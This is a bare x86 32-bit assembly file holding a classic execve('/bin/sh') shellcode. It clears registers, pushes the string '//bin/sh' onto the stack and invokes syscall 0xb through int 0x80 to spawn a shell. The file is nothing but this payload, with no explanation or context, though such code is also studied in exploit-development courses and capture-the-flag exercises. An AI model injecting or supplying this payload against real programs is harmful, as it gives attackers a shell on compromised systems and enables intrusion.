global _start
section .text
_start:
    xor ebx, ebx
    xor edx, edx
    xor ecx, ecx
    push ecx
    push 0x68732f6e
	push 0x69622f2f
    mov ebx, esp
    xor eax, eax
    mov al, 0xb
    and esp, 0xfffffff0
    int 0x80